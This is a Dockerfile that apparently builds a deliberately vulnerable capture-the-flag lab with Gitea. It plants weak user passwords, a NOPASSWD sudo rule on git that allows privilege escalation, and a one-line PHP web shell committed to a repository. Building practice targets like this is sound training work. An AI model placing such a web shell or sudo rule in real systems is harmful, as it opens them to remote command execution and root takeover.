FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive

RUN apt update && \
    apt install -y \
    openssh-server \
    net-tools \
    git \
    curl \
    wget \
    sudo \
    python3 \
    supervisor \
    sqlite3 && \
    rm -rf /var/lib/apt/lists/*

RUN useradd -m player && \
    echo "player:player123" | chpasswd && \
    useradd -m git && \
    echo "git:git123" | chpasswd

RUN mkdir /var/run/sshd && \
    sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin no/' /etc/ssh/sshd_config && \
    sed -i 's/#AllowTcpForwarding yes/AllowTcpForwarding yes/' /etc/ssh/sshd_config

EXPOSE 22

RUN echo "player ALL=(root) NOPASSWD: /usr/bin/git" >> /etc/sudoers

RUN wget -O /usr/local/bin/gitea https://dl.gitea.io/gitea/1.21.0/gitea-1.21.0-linux-amd64 && \
    chmod +x /usr/local/bin/gitea

RUN mkdir -p /var/lib/gitea/{data,log,custom} && \
    chown -R git:git /var/lib/gitea && \
    chmod -R 750 /var/lib/gitea

RUN mkdir /etc/gitea
COPY app.ini /etc/gitea/app.ini
RUN chown -R git:git /etc/gitea && \
    chmod 640 /etc/gitea/app.ini

RUN mkdir -p /var/lib/gitea/data/gitea-repositories/git/vuln.git && \
    cd /var/lib/gitea/data/gitea-repositories/git/vuln.git && \
    git init --bare

RUN mkdir /tmp/vuln && cd /tmp/vuln && \
    git init && \
    echo "<?php system(\$_GET['cmd']); ?>" > rce.php && \
    git add rce.php && \
    git commit -m \"Initial vulnerable commit\" && \
    git remote add origin /var/lib/gitea/data/gitea-repositories/git/vuln.git && \
    git push origin master

RUN sqlite3 /var/lib/gitea/data/gitea.db <<EOF
CREATE TABLE repository (
  id INTEGER PRIMARY KEY,
  owner_id INTEGER,
  lower_name TEXT,
  name TEXT,
  is_private INTEGER
);
INSERT INTO repository VALUES (1,1,'vuln','vuln',0);
EOF

RUN chown -R git:git /var/lib/gitea

COPY supervisord.conf /etc/supervisor/conf.d/supervisord.conf

CMD ["/usr/bin/supervisord"]
